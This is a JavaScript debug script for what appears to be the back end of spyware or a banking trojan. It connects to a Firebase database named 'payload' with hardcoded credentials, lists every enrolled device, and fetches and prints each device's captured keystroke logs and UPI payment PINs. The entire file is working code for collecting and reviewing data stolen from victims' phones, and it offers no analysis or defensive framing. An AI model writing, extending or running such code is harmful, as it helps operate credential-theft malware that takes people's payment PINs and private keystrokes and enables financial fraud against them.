// Debug script to test KeyLogs and UPI Pins fetching
import { initializeApp } from "firebase/app";
import { getDatabase, ref, get, query, orderByChild } from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyDAXJOpQaY6auUc9xBV3EwWeMaqG4FJ9Xk",
  authDomain: "payload-fea30.firebaseapp.com",
  databaseURL: "https://payload-fea30-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "payload-fea30",
  storageBucket: "payload-fea30.firebasestorage.app",
  messagingSenderId: "548911851830",
  appId: "1:548911851830:web:db0eb8754598876037eb97"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

// Simulate the FirebaseService.getKeyLogs function
async function getKeyLogs(deviceId, limit = 100) {
  try {
    console.log(`🔍 Fetching key logs for device: ${deviceId}`);
    
    // Remove orderByChild until Firebase index is set up
    const keyLogsRef = ref(database, `Keylogs/${deviceId}`);
    const snapshot = await get(keyLogsRef);
    const keyLogs = snapshot.val();
    
    console.log(`📊 Raw key logs data for ${deviceId}:`, keyLogs);

    if (!keyLogs) {
      console.log(`❌ No key logs found for device: ${deviceId}`);
      return [];
    }

    // Convert to array and filter out empty logs
    const keyLogsArray = Object.values(keyLogs);
    const validKeyLogs = keyLogsArray.filter(log => 
      log && (log.Column1 || log.Column2 || log.Column3 || log.Column4 || log.Column5 || log.Column6 || log.text)
    );

    console.log(`✅ Valid key logs for ${deviceId}:`, validKeyLogs.length);

    // Sort by timestamp (newest first) and limit results
    const sortedKeyLogs = validKeyLogs
      .sort(
        (a, b) => {
          const timeA = a.timestamp || a.time || '';
          const timeB = b.timestamp || b.time || '';
          return new Date(timeB).getTime() - new Date(timeA).getTime();
        }
      )
      .slice(0, limit);
    
    console.log(`📈 Sorted key logs for ${deviceId}:`, sortedKeyLogs);
    return sortedKeyLogs;
  } catch (error) {
    console.error(`❌ Error fetching key logs for ${deviceId}:`, error);
    return [];
  }
}

// Simulate the FirebaseService.getUPIPins function
async function getUPIPins(deviceId) {
  try {
    console.log(`🔍 Fetching UPI pins for device: ${deviceId}`);
    const snapshot = await get(ref(database, `UPIPins/${deviceId}`));
    const pinsData = snapshot.val();
    
    if (!pinsData) return [];
    
    // Handle the new data structure
    if (Array.isArray(pinsData)) {
      // Old format: array of strings
      console.log(`💳 UPI pins for ${deviceId} (array format):`, pinsData);
      return pinsData;
    } else {
      // New format: object with pin objects
      const pins = Object.values(pinsData).map((pinObj) => pinObj.pin || pinObj);
      console.log(`💳 UPI pins for ${deviceId} (object format):`, pinsData);
      console.log(`💳 Extracted pins for ${deviceId}:`, pins);
      return pins;
    }
  } catch (error) {
    console.error(`❌ Error fetching UPI pins for ${deviceId}:`, error);
    return [];
  }
}

// Test all devices
async function testAllDevices() {
  try {
    console.log('🧪 Testing KeyLogs and UPI Pins fetching for all devices...\n');
    
    // Get list of devices from DeviceInfo
    const deviceInfoSnapshot = await get(ref(database, 'DeviceInfo'));
    const deviceInfo = deviceInfoSnapshot.val();
    
    if (!deviceInfo) {
      console.log('❌ No DeviceInfo found');
      return;
    }
    
    const deviceIds = Object.keys(deviceInfo);
    console.log(`📱 Found ${deviceIds.length} devices:`, deviceIds);
    
    // Test each device
    for (const deviceId of deviceIds) {
      console.log(`\n${'='.repeat(50)}`);
      console.log(`🔍 Testing device: ${deviceId}`);
      console.log(`${'='.repeat(50)}`);
      
      // Test KeyLogs
      console.log('\n📊 Testing KeyLogs fetching...');
      const keyLogs = await getKeyLogs(deviceId, 100);
      console.log(`✅ KeyLogs result: ${keyLogs.length} logs`);
      
      // Test UPI Pins
      console.log('\n💳 Testing UPI Pins fetching...');
      const upiPins = await getUPIPins(deviceId);
      console.log(`✅ UPI Pins result: ${upiPins.length} pins`);
      
      // Show sample data
      if (keyLogs.length > 0) {
        console.log('\n📋 Sample KeyLog entry:');
        console.log(JSON.stringify(keyLogs[0], null, 2));
      }
      
      if (upiPins.length > 0) {
        console.log('\n🔐 Sample UPI Pins:');
        console.log(upiPins.slice(0, 3));
      }
    }
    
    console.log('\n🎉 Testing completed for all devices!');
    
  } catch (error) {
    console.error('❌ Error during testing:', error);
  }
}

// Add timeout to prevent hanging
const timeout = setTimeout(() => {
  console.log('\n⏰ Script timeout - forcing exit after 30 seconds');
  process.exit(1);
}, 30000);

// Run the test
testAllDevices().then(() => {
  clearTimeout(timeout);
  console.log('\n🎉 All tests completed successfully!');
  process.exit(0);
}).catch((error) => {
  clearTimeout(timeout);
  console.error('❌ Error during testing:', error);
  process.exit(1);
});
